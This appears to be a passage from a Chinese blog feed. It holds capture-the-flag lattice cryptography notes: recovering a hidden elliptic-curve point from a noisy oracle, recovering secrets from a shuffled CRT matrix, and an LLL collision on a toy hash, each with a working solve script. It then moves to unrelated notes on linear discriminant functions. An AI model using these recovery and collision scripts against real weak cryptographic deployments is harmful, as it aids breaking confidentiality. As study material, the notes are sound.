0&amp;2^{2k}&amp;\cdots&amp;0&amp;0&amp;\cdots&amp;0\\
\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\
0&amp;0&amp;\cdots&amp;2^{2k}&amp;0&amp;\cdots&amp;0\\
0&amp;0&amp;\cdots&amp;0&amp;2^{k}&amp;\cdots&amp;0\\
\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\
0&amp;0&amp;\cdots&amp;0&amp;0&amp;\cdots&amp;2^{k}
\end{bmatrix}
\]</span> 其中，<span class="math inline">\(k\)</span> 是 <span class="math inline">\(e_i\)</span> 的位数</p>
<p>使得 <span class="math display">\[
\boldsymbol{v}M=(2^{3k},e_02^{2k},\tilde{e}_12^{2k},\cdots,\tilde{e}_d2^{2k},e_0^22^{k},e_0\tilde{e}_12^{k},\cdots,e_0\tilde{e}_d2^k,e_0^2\tilde{e}_1,\cdots,e_0^2\tilde{e}_d)
\]</span> 这个解向量可以证明在格内。</p>
<h3 id="实例-3">实例</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">a = getPrime(<span class="number">200</span>)</span><br><span class="line">b = getPrime(<span class="number">200</span>)</span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">R = E.random_element()</span><br><span class="line">P = E.random_element()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt; mod =&#x27;</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt; a =&#x27;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt; b =&#x27;</span>, b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;&gt; R = (<span class="subst">&#123;R[<span class="number">0</span>]&#125;</span>, <span class="subst">&#123;R[<span class="number">1</span>]&#125;</span>)&#x27;</span>, )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">XennyOracle</span>(<span class="params">t</span>):</span><br><span class="line">    O = P + t*R</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(O[<span class="number">0</span>]) - getPrime(<span class="number">163</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>():</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        op = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">        <span class="keyword">if</span> op == <span class="number">1</span>:</span><br><span class="line">            XennyOracle(<span class="built_in">int</span>(<span class="built_in">input</span>()))</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="number">2</span>:</span><br><span class="line">            ss = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ss == P[<span class="number">0</span>]:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;flag: &#x27;</span>, flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    task()</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Error. try again.&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>我们可以从中获取椭圆曲线的参数，点 <span class="math inline">\(G\)</span> 和 14 对 <span class="math inline">\((e_0,\tilde{e}_i)\)</span>，还原脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = p</span><br><span class="line">a = a</span><br><span class="line">b = b</span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">G = E((x, y))</span><br><span class="line">hs = hs</span><br><span class="line">k = <span class="number">163</span></span><br><span class="line">d = <span class="built_in">len</span>(hs) - <span class="number">1</span></span><br><span class="line">Ai = []</span><br><span class="line">A0i = []</span><br><span class="line">Bi = []</span><br><span class="line">B0i = []</span><br><span class="line">Ci = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, d + <span class="number">1</span>):</span><br><span class="line">    Q = i * G</span><br><span class="line">    xQ = ZZ(Q[<span class="number">0</span>])</span><br><span class="line">    Ai.append(hs[i] - <span class="number">2</span> * xQ)</span><br><span class="line">    A0i.append(<span class="number">2</span> * (hs[<span class="number">0</span>] - xQ))</span><br><span class="line">    Bi.append(<span class="number">2</span> * (hs[i] * (hs[<span class="number">0</span>] - xQ) - <span class="number">2</span> * hs[<span class="number">0</span>] * xQ - a - xQ ^ <span class="number">2</span>))</span><br><span class="line">    B0i.append((hs[<span class="number">0</span>] - xQ) ^ <span class="number">2</span>)</span><br><span class="line">    Ci.append(hs[i] * (hs[<span class="number">0</span>] - xQ) ^ <span class="number">2</span> - <span class="number">2</span> * ((hs[<span class="number">0</span>] ^ <span class="number">2</span> +a) * xQ + (a + xQ ^ <span class="number">2</span>) * hs[<span class="number">0</span>] + <span class="number">2</span> * b))</span><br><span class="line">R = block_matrix(ZZ, [-matrix(Ci), -matrix(Bi), -diagonal_matrix(B0i), -matrix(Ai), -diagonal_matrix(A0i)], ncols=<span class="number">1</span>)</span><br><span class="line">P = diagonal_matrix(ZZ, [p] * d)</span><br><span class="line">E = block_diagonal_matrix([matrix([<span class="number">8</span>^k]), diagonal_matrix([<span class="number">4</span>^k] * (d + <span class="number">1</span>)), diagonal_matrix([<span class="number">2</span>^k] * (d + <span class="number">1</span>))])</span><br><span class="line">M = block_matrix([[E, R], [<span class="number">0</span>, P]])</span><br><span class="line">shortest_vector = M.LLL()[<span class="number">0</span>]</span><br><span class="line">es = shortest_vector[<span class="number">1</span>:d+<span class="number">1</span>] / <span class="number">4</span> ^ k</span><br><span class="line">xP = ZZ(hs[<span class="number">0</span>] + es[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(xP)</span><br></pre></td></tr></table></figure>
<h1 id="noise">Noise</h1>
<h2 id="noise-crt">Noise CRT</h2>
<p>噪声 CRT，指的是对正常的 CRT 矩阵 <span class="math display">\[
A=\begin{bmatrix}
N_1\pmod{p_0}&amp;N_2\pmod{p_0}&amp;\cdots&amp;N_n\pmod{p_0}\\
N_1\pmod{p_1}&amp;N_2\pmod{p_1}&amp;\cdots&amp;N_n\pmod{p_1}\\
\vdots&amp;\vdots&amp;\vdots&amp;\vdots\\
N_1\pmod{p_m}&amp;N_2\pmod{p_m}&amp;\cdots&amp;N_b\pmod{p_m}\\
\end{bmatrix}
\]</span> 每一行进行置乱（噪声污染），那么对这种被噪声污染的 CRT
矩阵，已知 <span class="math inline">\((p_0,\cdots,_n)\)</span>
和噪声结果 <span class="math inline">\(S_{n\times m}\)</span> 如何还原
<span class="math inline">\((N_1,\cdots,N_n)\)</span>
是主要研究问题。</p>
<p>一个可能的生成噪声 CRT 矩阵的代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">N = [getRandomNBitInteger(<span class="number">3211</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">N</span>):</span><br><span class="line">    p,S = [],[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        p.append(getPrime(<span class="number">321</span>))</span><br><span class="line">        r = [N[_]%p[i] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>)]</span><br><span class="line">        shuffle(r)</span><br><span class="line">        S.append(r)</span><br><span class="line">    <span class="keyword">return</span> p, S</span><br><span class="line"></span><br><span class="line">p, S = leak(N)</span><br></pre></td></tr></table></figure>
<p>解决代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = <span class="number">15</span></span><br><span class="line">nbits = <span class="number">3211</span></span><br><span class="line">P = prod(p)</span><br><span class="line">Ti = []</span><br><span class="line"><span class="keyword">for</span> i, pi <span class="keyword">in</span> <span class="built_in">enumerate</span>(p):</span><br><span class="line">    Pi = P // pi</span><br><span class="line">    invPi = inverse_mod(Pi, pi)</span><br><span class="line">    Ti.extend(S[i][j] * Pi * invPi <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m))</span><br><span class="line">T = column_matrix(Ti)</span><br><span class="line">B = diagonal_matrix([<span class="number">2</span>^nbits] * <span class="built_in">len</span>(Ti))</span><br><span class="line">M = block_matrix([[matrix([P]), <span class="number">0</span>], [T, B]])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flatter</span>(<span class="params">M</span>):</span><br><span class="line">    <span class="keyword">from</span> subprocess <span class="keyword">import</span> check_output</span><br><span class="line">    <span class="keyword">import</span> re</span><br><span class="line">    inputM = <span class="string">&quot;[[&quot;</span> + <span class="string">&quot;]\n[&quot;</span>.join(<span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, row)) <span class="keyword">for</span> row <span class="keyword">in</span> M) + <span class="string">&quot;]]&quot;</span></span><br><span class="line">    outputM = check_output([<span class="string">&quot;flatter&quot;</span>], <span class="built_in">input</span>=inputM.encode())</span><br><span class="line">    <span class="keyword">return</span> matrix(M.nrows(), M.ncols(), <span class="built_in">map</span>(<span class="built_in">int</span>, findall(<span class="string">b&quot;-?\\d+&quot;</span>, outputM)))</span><br><span class="line"></span><br><span class="line">flatter(M)</span><br></pre></td></tr></table></figure>
<h1 id="hash">Hash</h1>
<h2 id="简单-hash">简单 Hash</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">msg: <span class="built_in">bytes</span></span>):</span><br><span class="line">    n = <span class="number">30798082519452208630254982405300548841337042015746308462162479889627080155514391987610153873334549377764946092629701</span></span><br><span class="line">    g = <span class="number">91289086035117540959154051117940771730039965839291520308840839624996039016929</span></span><br><span class="line">    N = <span class="number">2</span> ** <span class="number">100</span></span><br><span class="line">    <span class="keyword">for</span> mi <span class="keyword">in</span> msg:</span><br><span class="line">        n = g * (<span class="number">2</span> * n + mi) % N</span><br><span class="line">    <span class="keyword">return</span> (n - <span class="number">0xdeedbeef114514</span>) % N</span><br></pre></td></tr></table></figure>
<p>考虑这个哈希算法全是线性操作，用 <span class="math inline">\(m_i\)</span> 表示每个字节，仅考虑 <span class="math inline">\(n_{i+1}=2gn_i+g\cdot m_i\)</span> 且 <span class="math inline">\(n_0\)</span> 存在，那么可以展开得到 <span class="math display">\[
\begin{align}
n_{i+1}&amp;=(2g)^{i+1}n_0+(2g)^ig\cdot m_0+(2g)^{i-1}g\cdot
m_1+\cdots+(2g)^0g\cdot m_{i}\pmod{N}\\
&amp;=(2g)^{i+1}n_0+\sum^{i}_{k=0}(2g)^{i-k}g\cdot m_k
\end{align}
\]</span> 要进行碰撞两个相同哈希值但不同的字节流，不妨设两个字节流分别为
<span class="math inline">\((s_0,\cdots,s_i),(t_0,\cdots,t_i)\)</span>，即可以表示为
<span class="math display">\[
\begin{align}
n_{i+1}&amp;=(2g)^{i+1}n_0+\sum^{i}_{k=0}(2g)^{i-k}g\cdot s_k\pmod{N}\\
&amp;=(2g)^{i+1}n_0+\sum^{i}_{k=0}(2g)^{i-k}g\cdot t_k\pmod{N}
\end{align}
\]</span> 等式左右两边相减可得 <span class="math display">\[
\sum^{i}_{k=0}(2g)^{i-k}g\cdot (s_k-t_k)\equiv 0\pmod{N}
\]</span> 不妨令 <span class="math inline">\(e_k=s_k-t_k\)</span>，可以构建矩阵 <span class="math display">\[
R=\begin{bmatrix}
(2g)^ig\\
(2g)^{i-1}g\\
\vdots\\
(2g)^0g
\end{bmatrix}
\]</span> 满足 <span class="math display">\[
(e_0,e_1,\cdots,e_i,k)\begin{bmatrix}
R\\
N
\end{bmatrix}=0
\]</span> 这里的 <span class="math inline">\(k\)</span>
是同余方程的常系数。</p>
<p>那么可以构建格规约 <span class="math display">\[
M=\begin{bmatrix}
1&amp;0&amp;\cdots&amp;0&amp;(2g)^ig\\
0&amp;1&amp;\cdots&amp;0&amp;(2g)^{i-1}g\\
\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots\\
0&amp;0&amp;0&amp;1&amp;(2g)^0g\\
0&amp;0&amp;0&amp;0&amp;N
\end{bmatrix}
\]</span> 可以证明解向量 <span class="math inline">\((e_0,e_1,\cdots,e_i,0)\)</span> 在格内。</p>
<p>格中最后一个元素为 <span class="math inline">\(0\)</span>
的向量即是我们想要寻找的向量。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">30798082519452208630254982405300548841337042015746308462162479889627080155514391987610153873334549377764946092629701</span></span><br><span class="line">g = <span class="number">91289086035117540959154051117940771730039965839291520308840839624996039016929</span></span><br><span class="line">N = <span class="number">2</span> ** <span class="number">100</span></span><br><span class="line">msize = <span class="number">33</span></span><br><span class="line"></span><br><span class="line">R = [(<span class="number">2</span> * g) ** (i) * g <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(msize)]</span><br><span class="line">R = column_matrix(R[::-<span class="number">1</span>]) % N</span><br><span class="line">E = identity_matrix(msize)</span><br><span class="line">M = block_matrix([[E, R], [<span class="number">0</span>, matrix([N])]])</span><br><span class="line">X = M.LLL()</span><br><span class="line">sbytes = <span class="string">b&#x27;a&#x27;</span> * msize</span><br><span class="line"><span class="built_in">print</span>(sbytes, <span class="built_in">hash</span>(sbytes))</span><br><span class="line">tbytes = <span class="built_in">list</span>(<span class="string">b&#x27;a&#x27;</span> * msize)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(msize):</span><br><span class="line">    tbytes[i] -= X[<span class="number">2</span>][i]</span><br><span class="line">tbytes = <span class="built_in">bytes</span>(tbytes)</span><br><span class="line"><span class="built_in">print</span>(tbytes, <span class="built_in">hash</span>(tbytes))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27; 842280076996392056218680371307</span></span><br><span class="line"><span class="string">b&#x27;bdabdefd]]\\`[cbb^b]dfcc_\\`bda\\caa&#x27; 842280076996392056218680371307</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>crypto</tag>
        <tag>lattice</tag>
      </tags>
  </entry>
  <entry>
    <title>模式识别-线性判别函数笔记</title>
    <url>//linear-discriminant-function.html</url>
    <content><![CDATA[<h1 id="模式识别">模式识别</h1>
<h2 id="二类线性判别函数">二类线性判别函数</h2>
<p>线性判别函数有许多优势，其中一个优势是便于分析和计算。在之前的贝叶斯决策中笔记中曾简单涉及到的贝叶斯判别函数，<strong>当满足某些情况时，判别函数是线性的</strong>。</p>
<p>我们抽象出这种线性特质，即定义<strong>线性判别函数</strong>形如 <span class="math display">\[
g(\boldsymbol{x})=\boldsymbol{w}^T\boldsymbol{x}+w_0
\]</span> 其中，<span class="math inline">\(\boldsymbol{w}\)</span>
是<strong>权向量</strong>（weight
vector），决定了特征向量中每个属性在判别函数中的占比；<span class="math inline">\(w_0\)</span>
是<strong>偏置</strong>（bias），决定了该线性判别函数的位置。</p>
<p>在这其中，二类线性判别函数在实战中常被用到，故以下仅讨论<strong>二类线性判别函数</strong>的问题，其中可能往往都以<strong>二维二类线性判别函数</strong>为例。</p>
<p><strong>性质一：权向量 <span class="math inline">\(\boldsymbol{w}\)</span>
与判别面上任意一个向量正交，即权向量决定了判别边界的方向。</strong></p>
<blockquote>
<p>对于一个二维二类线性判别函数，假设判别面上存在任意两点 <span class="math inline">\(x_1,x_2\)</span>，那么其满足 <span class="math display">\[
\boldsymbol{w}^Tx_1+w_0=\boldsymbol{w}^Tx_2+w_0
\]</span> 可以改写成 <span class="math display">\[
\boldsymbol{w}^T(x_1-x_2)=0
\]</span> 即权向量与判别面上的任意一向量正交（相互垂直）。</p>
<p>可以推广到，权向量同时也与超平面（多维情况下的判别边界）上的任意向量正交。</p>
</blockquote>
<p><strong>性质二：判别函数 <span class="math inline">\(g(\boldsymbol{x})\)</span> 与特征向量 <span class="math inline">\(\boldsymbol{x}\)</span>
到判决边界（判决面）的距离成正比。</strong></p>
<blockquote>
<p>我们定义 <span class="math inline">\(r\)</span> 为特征空间中某点
<span class="math inline">\(\boldsymbol{x}\)</span>
到判决边界（超平面）的算数距离（正代表在超平面正侧，反之亦然）；使用
<span class="math inline">\(\frac{\boldsymbol{w}}{\|\boldsymbol{w}\|}\)</span>
来表示单位向量，那么特征向量 <span class="math inline">\(\boldsymbol{x}\)</span> 可以表示成 <span class="math display">\[
\boldsymbol{x}=\boldsymbol{x}_p+r\frac{\boldsymbol{w}}{\|\boldsymbol{w}\|}
\]</span> 其中 <span class="math inline">\(\boldsymbol{x}_p\)</span>
是特征向量在判决边界上的投影，有 <span class="math inline">\(g(\boldsymbol{x}_p)=0\)</span>。</p>
<p>代入判决函数，可以得到 <span class="math display">\[
\boldsymbol{w}^T\boldsymbol{x}+w_0=r\|\boldsymbol{w}\|
\]</span> 即 <span class="math display">\[
r=\frac{g(\boldsymbol{x})}{\|\boldsymbol{w}\|}
\]</span></p>
</blockquote>
<p>由<strong>性质二</strong>，我们定义</p>
<p><span class="math inline">\(g(\boldsymbol{x})&gt;0\)</span>
称作判决边界（判决面）的正面；<span class="math inline">\(g(\boldsymbol{x})&lt;0\)</span>
称作判决边界的反面；<span class="math inline">\(g(\boldsymbol{x})=0\)</span> 则 <span class="math inline">\(\boldsymbol{x}\)</span> 是在判决边界上。</p>
<p><strong>性质三：线性判别函数中的偏置 <span class="math inline">\(w_0\)</span> 表征了原点到判别边界的距离。若 <span class="math inline">\(w_0&gt;0\)</span>，则原点位于判别边界的正面；反之亦然。</strong></p>
<blockquote>
<p>我们显然可以得知 <span class="math display">\[
g(\boldsymbol{0})=w_0
\]</span> 故结论显然。</p>
</blockquote>
<h2 id="多类情况下的线性判别函数">多类情况下的线性判别函数</h2>
<h3 id="情况一">情况一</h3>
<p>如果每个模式类均可用一个单独的线性判别边界与其余模式类分开，那么此时仅需
<span class="math inline">\(c\)</span> 个判别函数，且具有以下性质：
<span class="math display">\[
\begin{cases}
g_i(\boldsymbol{x})&gt;0 &amp; \boldsymbol{x}\in\omega_i\\
g_i(\boldsymbol{x})&lt;0 &amp; \boldsymbol{x}\notin\omega_i
\end{cases}
\]</span> <img src="/linear-discriminant-function/情况一下的多类问题分类界面.png" alt="情况一下的多类问题分类界面"></p>
<p>当关于特征向量有 <span class="math inline">\(\boldsymbol{x}\)</span>
满足 <span class="math inline">\(g_i(\boldsymbol{x})&gt;0\)</span>
且所有 <span class="math inline">\(g_j{(\boldsymbol{x})}&lt;0\)</span>
时，判决为 <span class="math inline">\(\omega_i\)</span>；反之不作判决。</p>
<p>故可以发现，该方法存在<strong>失效区或不定区</strong>，在图中表现为<strong>模糊区域</strong>，即存在多于一个判别函数大于
0 或所有的判别函数都小于 0。</p>
<h3 id="情况二">情况二</h3>
<p>如果线性判别边界只能将模式类两两分开，那么需要 <span class="math inline">\(c(c-1)/2\)</span> 个判别函数，且具有以下性质 <span class="math display">\[
\begin{cases}
g_{ij}(\boldsymbol{x})&gt;0 &amp; \boldsymbol{x}\in\omega_i\\
g_{ij}(\boldsymbol{x})&lt;0 &amp; \boldsymbol{x}\in\omega_j
\end{cases}
\]</span> 显然，应有 <span class="math display">\[
g_{ij}(\boldsymbol{x})=-g_{ji}(\boldsymbol{x})
\]</span> <img src="/linear-discriminant-function/情况二下的多类问题分类界面.png" alt="情况二下的多类问题分类界面"></p>
<p>当特征向量 <span class="math inline">\(\boldsymbol{x}\)</span>
满足对所有的 <span class="math inline">\(j\neq i\)</span> 均有 <span class="math inline">\(g_{ij}(\boldsymbol{x})&gt;0\)</span>，那么判决为
<span class="math inline">\(\omega_i\)</span>，反之不判决。</p>
<p>同理，该种方式任然存在不定区，采用拒识策略。</p>
<blockquote>
<p>拒识策略即不进行判决。</p>
</blockquote>
<h3 id="情况三">情况三</h3>
<p>不考虑二类问题的线性判别函数，采用 <span class="math inline">\(c\)</span>
个线性判别函数进行分类，但不同于情况一，此时的识别准则变更为</p>
<p>对于所有的 <span class="math inline">\(i\neq j\)</span>，若 <span class="math inline">\(g_i(\boldsymbol{x})&gt;g_j(\boldsymbol{x})\)</span>，则判决为
<span class="math inline">\(\omega_i\)</span>。</p>
<p>该种方法实际上是将特征空间划分为 <span class="math inline">\(c\)</span> 个判决区域 <span class="math inline">\(\{R_1,R_2,\cdots,R_c\}\)</span>，在判决区域 <span class="math inline">\(R_i\)</span> 内，<span class="math inline">\(g_i(\boldsymbol{x})\)</span>
具有最大的函数值。</p>
<p>如果 <span class="math inline">\(R_i\)</span> 与 <span class="math inline">\(R_j\)</span> 相邻，则决策面是方程 <span class="math inline">\(g_i(\boldsymbol{x})=g_j(\boldsymbol{x})\)</span>
的一部分。</p>
<blockquote>
<p>因为决策面还有可能与其他模式冲突，所以这里描述为一部分。</p>
</blockquote>
<p>但该种方法的优点是不存在不定区。</p>
<figure>
<img src="/linear-discriminant-function/情况三下的多类问题分类界面.png" alt="情况三下的多类问题分类界面">
<figcaption aria-hidden="true">情况三下的多类问题分类界面</figcaption>
</figure>
<h3 id="总结">总结</h3>
<p>由上述情况可知，多类情况实际上可以转化为二类问题进行处理，故我们仅需研究二类问题中的线性判别函数即可。</p>
<h2 id="线性判别函数的学习算法">线性判别函数的学习算法</h2>
<h3 id="增广化">增广化</h3>
<p>我们知道线性判别函数一般具有以下形式 <span class="math display">\[
g(\boldsymbol{x})=\boldsymbol{w}^T\boldsymbol{x}+w_0=w_1x_1+w_2x_2+\cdots+w_dx_d+w_0
\]</span> 不妨我们设 <span class="math display">\[
\boldsymbol{a}=\begin{bmatrix}
w_0\\
w_1\\
\vdots\\
w_d
\end{bmatrix},\boldsymbol{y}=\begin{bmatrix}
1\\
x_1\\
\vdots\\
x_d
\end{bmatrix}
\]</span> 将原判别函数写成 <span class="math display">\[
g(\boldsymbol{y})=\boldsymbol{a}^T\boldsymbol{y}
\]</span> 其中 <span class="math inline">\(\boldsymbol{a},\boldsymbol{y}\)</span> 的维度均为
<span class="math inline">\(d+1\)</span> 维。</p>
<p>我们把这种化简称作<strong>增广化</strong>。</p>
<p>比如说我们有两类样本 <span class="math display">\[
\omega_1:\boldsymbol{x}_{11}=(0,0),\boldsymbol{x}_{12}=(0,1)\\
\omega_2:\boldsymbol{x}_{21}=(1,0),\boldsymbol{x}_{22}=(1,1)\\
\]</span> 我们对其进行增广化，得到 <span class="math display">\[
\omega_1:\boldsymbol{x}_{11}=(1,0,0),\boldsymbol{x}_{12}=(1,0,1)\\
\omega_2:\boldsymbol{x}_{21}=(1,1,0),\boldsymbol{x}_{22}=(1,1,1)\\
\]</span></p>
<blockquote>
<p>增广化的结果不唯一，比如说也可以存在增广化结果为 <span class="math inline">\(\boldsymbol{x}_{11}=(0,0,1)\)</span></p>
</blockquote>
<p>增广化后的线性判别函数，判别面是<strong>过原点的超平面</strong>。</p>
<blockquote>
<p>对于过原点的一个判决边界，简化了我们计算权向量的过程。</p>
</blockquote>
<p>同时对于二类问题，有</p>
<p>若 <span class="math inline">\(g(\boldsymbol{y})=\boldsymbol{a}^T\boldsymbol{y}&gt;0\)</span>，则
<span class="math inline">\(\boldsymbol{y}\in\omega_1\)</span>，即 <span class="math inline">\(\boldsymbol{x}\in\omega_1\)</span>；</p>
<p>若 <span class="math inline">\(g(\boldsymbol{y})=\boldsymbol{a}^T\boldsymbol{y}&lt;0\)</span>，则
<span class="math inline">\(\boldsymbol{y}\in\omega_2\)</span>，即 <span class="math inline">\(\boldsymbol{x}\in\omega_2\)</span>。</p>
<figure>
<img src="/linear-discriminant-function/一个三维增广化后的特征空间.png" alt="一个三维增广化后的特征空间">
<figcaption aria-hidden="true">一个三维增广化后的特征空间</figcaption>
</figure>
<h3 id="规范化">规范化</h3>
<p>沿着上面的增广化，比如说对于一个一维二类线性判别函数，它增广化后的判决面（二维空间）是权空间中的一条直线，这条直线将不同类别的向量区分开。</p>
<figure>
<img src="/linear-discriminant-function/非规范化样本.png" alt="非规范化样本">
<figcaption aria-hidden="true">非规范化样本</figcaption>
</figure>
<p>于是乎我们可以得到在某个范围内的<strong>权向量</strong> <span class="math inline">\(\boldsymbol{a}\)</span>
构造出的直线都能满足这个条件，我们称这个区域叫做<strong>解区域</strong>（solution
region）。</p>
<p>但在计算上，验证某些向量是否被这条直线错误的区别是繁琐的，但学习过程中却又需要大量验证某些向量是否被错误分类了，故我们需要对这些向量进行<strong>规范化</strong>。</p>
<p>我们不妨令对于所有 <span class="math inline">\(\boldsymbol{y}\in
\omega_2\)</span> 都有 <span class="math display">\[
\boldsymbol{y}=-\boldsymbol{y}
\]</span> 这样，我们就使得所有的正确分类都有 <span class="math display">\[
g(\boldsymbol{y})&gt;0
\]</span> <img src="/linear-discriminant-function/规范化样本.png" alt="规范化样本"></p>
<p>当我们需要判断某个向量是否被权向量错误分类时，仅需有如下规则：</p>
<p>若 <span class="math inline">\(g(\boldsymbol{y})&gt;0\)</span>，则
<span class="math inline">\(\boldsymbol{y}\)</span>
被<strong>正确</strong>分类；</p>
<p>若 <span class="math inline">\(g(\boldsymbol{y})&lt;0\)</span>，则
<span class="math inline">\(\boldsymbol{y}\)</span>
被<strong>错误</strong>分类。</p>
<p>这极大的简化了运算过程。</p>
<p>跟随上文，我们有如下被增广化后的向量 <span class="math display">\[
\omega_1:\boldsymbol{x}_{11}=(1,0,0),\boldsymbol{x}_{12}=(1,0,1)\\
\omega_2:\boldsymbol{x}_{21}=(1,1,0),\boldsymbol{x}_{22}=(1,1,1)\\
\]</span> 对其进行规范化，有 <span class="math display">\[
\begin{align}
&amp;\omega_1:\boldsymbol{x}_{11}=(1,0,0),\boldsymbol{x}_{12}=(1,0,1)\\
&amp;\omega_2:\boldsymbol{x}_{21}=(-1,-1,0),\boldsymbol{x}_{22}=(-1,-1,-1)
\end{align}
\]</span> 对于满足所有上述条件的向量 <span class="math inline">\(\boldsymbol{a}\)</span>
都称作是<strong>解向量</strong>，也可以发现，每个学习样本都对解向量做了限制，但解向量也不唯一。</p>
<p>如果存在解向量 <span class="math inline">\(\boldsymbol{a}\)</span>
使得二类样本分类正确，则样本被称作是<strong>线性可分</strong>的；反之称作<strong>线性不可分</strong>。</p>
<figure>
<img src="/linear-discriminant-function/线性可分.png" alt="线性可分">
<figcaption aria-hidden="true">线性可分</figcaption>
</figure>
<h3 id="学习算法原理">学习算法原理</h3>
<p>要求解解向量 <span class="math inline">\(\boldsymbol{a}\)</span>，根据上面的理论我们需要通过学习样本来求解不等式组
<span class="math display">\[
\boldsymbol{a}^T\boldsymbol{y}_i&gt;0,i=1,2,\cdots,n
\]</span>
但当权向量维度很大，学习样本足够多时，显然<strong>直接求解不等式组是困难的</strong>。</p>
<p>同时我们希望在样本<strong>线性可分</strong>时，得到的判别函数能够将所有的训练样本正确分类；在样本<strong>线性不可分</strong>时，得到的判别函数产生错误的概率最小（或者称误差最小）。</p>
<p>为转化困难问题为简单问题，我们定义一个<strong>标量函数</strong> <span class="math inline">\(J(\boldsymbol{a})\)</span>，<strong>如果 <span class="math inline">\(J(\boldsymbol{a})\)</span>
的值越小，则判别面的分割质量越高</strong>。</p>
<blockquote>
<p>标量函数指的是输出值为标量的函数，同时有时也称准则函数。</p>
</blockquote>
<p>那么求解解向量 <span class="math inline">\(\boldsymbol{a}\)</span>
就变为求解标量函数 <span class="math inline">\(J(\boldsymbol{a})\)</span>
极小值（最小值）的问题。</p>
<p>那么如何定义合理的标量函数 <span class="math inline">\(J(\boldsymbol{a})\)</span>
能更准确的表示它的含义成为了新问题。</p>
<p>最直观的准则函数的定义是<strong>最少错分样本数准则</strong>，即令
<span class="math inline">\(J(\boldsymbol{a})\)</span>
为样本集合中被错误分类的样本数。</p>
<figure>
<img src="/linear-discriminant-function/最少错分样本数准则下的准则函数.png" alt="最少错分样本数准则下的准则函数">
<figcaption aria-hidden="true">最少错分样本数准则下的准则函数</figcaption>
</figure>
<p>但我们可以直观的发现，此时 <span class="math inline">\(J(\boldsymbol{a})\)</span>
是一个分段函数，对于这种函数在性质上是不被喜欢的，因为它<strong>不光滑</strong>，无法用现有的高效的数学工具求解函数极小值，对计算机来说可能将要遍历所有的函数值才能找到它的极小值。</p>
<p>因此，一个更好的选择是<strong>错分样本到判别面的距离之和准则</strong>，也称作<strong>感知器准则</strong>，<strong>感知器准则函数</strong>的定义如下
<span class="math display">\[
J_p(\boldsymbol{a})=\sum_{\boldsymbol{y}\in
Y_e}(-\boldsymbol{a}^T\boldsymbol{y})
\]</span> 即选择了某个解向量 <span class="math inline">\(\boldsymbol{a}\)</span>
后，被错分的样本到判别面的距离之和，其中 <span class="math inline">\(Y_e\)</span> 代表所有被错分向量的集合。</p>
<blockquote>
<p>这里的计算是规范化后的计算，所以需要加个负号，这样仅需关注距离和。</p>
</blockquote>
<p>此时满足 <span class="math inline">\(J_p(\boldsymbol{a})\geq
0\)</span>，其存在极小值使得样本无错分或错分误差最小。</p>
<blockquote>
<p>当且仅当样本线性可分时，极小值取得 0。</p>
</blockquote>
<h3 id="梯度下降算法">梯度下降算法</h3>
<p>梯度下降算法是一个用来求函数极小值的算法，仅需要知道函数在各点的导数，便可以快速迭代找到极小值点。</p>
<blockquote>
